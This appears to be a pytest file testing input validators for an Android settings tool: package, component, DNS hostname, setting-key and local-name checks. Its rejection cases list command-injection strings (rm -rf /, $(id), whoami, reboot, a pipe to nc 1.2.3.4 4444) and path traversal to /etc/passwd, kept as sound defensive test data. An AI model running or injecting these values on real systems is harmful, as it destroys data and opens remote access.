from __future__ import annotations

import pytest

from relite.validate import (
    ValidationError,
    validate_component_name,
    validate_dns_hostname,
    validate_local_name,
    validate_package_name,
    validate_setting_key,
)


@pytest.mark.parametrize(
    "name",
    [
        "com.android.settings",
        "io.relite.home",
        "com.google.android.gms",
        # Real-device finding (RMX5303, 2026-08-09): the Android framework
        # package itself is a single segment with no dot.
        "android",
    ],
)
def test_validate_package_name_accepts_real_packages(name):
    assert validate_package_name(name) == name


@pytest.mark.parametrize(
    "name",
    [
        "",
        "com.example; rm -rf /",
        "com.example`whoami`",
        "com.example$(id)",
        "com.example && reboot",
        "com.example|nc 1.2.3.4 4444",
        "com/example",
        "com example",
        "com.example\nrm -rf",
    ],
)
def test_validate_package_name_rejects_shell_metacharacters(name):
    with pytest.raises(ValidationError):
        validate_package_name(name)


@pytest.mark.parametrize(
    "component",
    [
        "com.android.settings/.Settings",
        "com.example.app/com.example.app.MainActivity",
        "com.example.app/com.example.app.MainActivity$Inner",
    ],
)
def test_validate_component_name_accepts_real_components(component):
    assert validate_component_name(component) == component


@pytest.mark.parametrize(
    "component",
    [
        "",
        "com.example.app",  # missing /Class
        "com.example.app/.Class; rm -rf /",
        "com.example.app/`id`",
    ],
)
def test_validate_component_name_rejects_malformed(component):
    with pytest.raises(ValidationError):
        validate_component_name(component)


@pytest.mark.parametrize("hostname", ["dns.example.com", "one.one.one.one", "a-b.c-d.example.org"])
def test_validate_dns_hostname_accepts_real_hostnames(hostname):
    assert validate_dns_hostname(hostname) == hostname


@pytest.mark.parametrize(
    "hostname",
    [
        "",
        "dns.example.com; rm -rf /",
        "dns example.com",
        "dns.example.com`id`",
        "dns.example.com$(whoami)",
        "no-dot-hostname",
        "-leading-hyphen.example.com",
        "trailing-hyphen-.example.com",
        "a" * 260 + ".com",
    ],
)
def test_validate_dns_hostname_rejects_malicious_or_malformed(hostname):
    with pytest.raises(ValidationError):
        validate_dns_hostname(hostname)


@pytest.mark.parametrize("key", ["window_animation_scale", "private_dns_mode", "_leading_underscore"])
def test_validate_setting_key_accepts_real_keys(key):
    assert validate_setting_key(key) == key


@pytest.mark.parametrize("key", ["", "key; rm -rf /", "key with spaces", "key`id`", "1starts_with_digit"])
def test_validate_setting_key_rejects_malicious_or_malformed(key):
    with pytest.raises(ValidationError):
        validate_setting_key(key)


@pytest.mark.parametrize("name", ["stock", "auto-pre-relite", "before_v0.3", "2026-08-10-safe"])
def test_validate_local_name_accepts_reasonable_names(name):
    assert validate_local_name(name) == name


@pytest.mark.parametrize(
    "name",
    [
        "",
        ".",
        "..",
        "../../etc/passwd",
        "../escape",
        "a/b",
        "a\\b",
        ".leading-dot",
        "name with spaces",
        "name; rm -rf /",
        "a" * 200,
    ],
)
def test_validate_local_name_rejects_traversal_and_malformed(name):
    with pytest.raises(ValidationError):
        validate_local_name(name)
